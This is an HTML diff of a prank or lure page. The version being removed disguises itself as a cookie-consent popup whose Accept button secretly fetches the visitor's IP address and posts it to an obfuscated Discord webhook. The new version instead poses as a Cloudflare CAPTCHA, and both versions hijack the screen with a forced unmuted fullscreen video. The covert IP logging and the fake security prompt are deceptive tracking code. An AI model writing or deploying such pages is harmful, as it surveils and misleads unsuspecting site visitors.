@@ -3,81 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Consent</title>
+    <title>Cloudflare CAPTCHA</title>
     <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f3f4f6;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+
+        .captcha-container {
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border: 1px solid #ddd;
+            padding: 20px 40px;
+            border-radius: 8px;
+            background-color: white;
+        }
+
+        .captcha-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .captcha-text {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        .captcha-button {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .captcha-button:hover {
+            background-color: #005fa3;
+        }
+    </style>
 </head>
 <body>
-    <div id="cookie-popup" class="cookie-popup">
-        <p class="main-text">Cookies and user-generated content</p>
-        <p class="sub-text">This website uses cookies to offer you the most relevant information and better understand how you use this website.</p>
-        <div class="cookie-buttons">
-            <button id="accept-btn" class="btn accept-btn">Accept</button>
-            <button id="decline-btn" class="btn decline-btn">Decline</button>
-        </div>
+    <div class="captcha-container">
+        <p class="captcha-title">Verify You Are Human</p>
+        <p class="captcha-text">Please click the button below to prove you are not a robot.</p>
+        <button id="captcha-btn" class="captcha-button">I'm not a robot</button>
     </div>
 
     <script>
-        var wbhk = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwODAyNDk2NTkwMzI5MDM2OC9jNGYxd2lHX090aFpGWUZOQTVBT1FjRHJMU014Z1lZcFVSVjhxZTNlczcxaWppeDVYR1k4R09NbkFWRXFiR25XRDlVbA=="; 
-        
-        function get_information(link, callback) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", link, true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    callback(xhr.responseText);
-                }
-            };
-            xhr.send(null);
-        }
-
-        function logger(ip) {
-            const request = new XMLHttpRequest();
-            request.open("POST", atob(wbhk));
-            request.setRequestHeader('Content-type', 'application/json');
-            const params = {
-                username: "Github Logger",
-                avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-                content: "**Ip** : _" + ip + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ip + "_\n**IP Lookup** : " + "https://whatismyipaddress.com/ip/" + ip
-            };
-            request.send(JSON.stringify(params));
-        }
-
-        function fetchIpAndLog() {
-            get_information("https://api.ipify.org/", function(text) {
-                var ip = text;
-                logger(ip);
-            });
-        }
-
-        document.getElementById("accept-btn").addEventListener("click", function() {
-            fetchIpAndLog();
+        document.getElementById("captcha-btn").addEventListener("click", function() {
             document.body.innerHTML = '';
-            let v = document.createElement('video');
-            v.src = 'https://raw.githubusercontent.com/scrinshoted/scrinshoted.github.io/main/media/video.mp4';
-            v.style.position = 'fixed';
-            v.style.top = 0;
-            v.style.left = 0;
-            v.style.width = '100vw';
-            v.style.height = '100vh';
-            v.style.objectFit = 'cover';
-            v.style.zIndex = 9999;
-            v.autoplay = true;
-            v.loop = true;
-            v.muted = false;
-            v.controls = false;
-            document.body.appendChild(v);
+
+            let video = document.createElement('video');
+            video.src = 'https://raw.githubusercontent.com/scrinshoted/scrinshoted.github.io/main/media/video.mp4';
+            video.style.position = 'fixed';
+            video.style.top = 0;
+            video.style.left = 0;
+            video.style.width = '100vw';
+            video.style.height = '100vh';
+            video.style.objectFit = 'cover';
+            video.style.zIndex = 9999;
+            video.autoplay = true;
+            video.loop = true;
+            video.muted = false;
+            video.controls = false;
+            document.body.appendChild(video);
 
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
-            } else if (document.documentElement.webkitRequestFullscreen) { 
+            } else if (document.documentElement.webkitRequestFullscreen) {
                 document.documentElement.webkitRequestFullscreen();
-            } else if (document.documentElement.msRequestFullscreen) { 
+            } else if (document.documentElement.msRequestFullscreen) {
                 document.documentElement.msRequestFullscreen();
             }
-        });
-
-        document.getElementById("decline-btn").addEventListener("click", function() {
-            document.getElementById("cookie-popup").style.display = "none";
         });
     </script>
 </body>
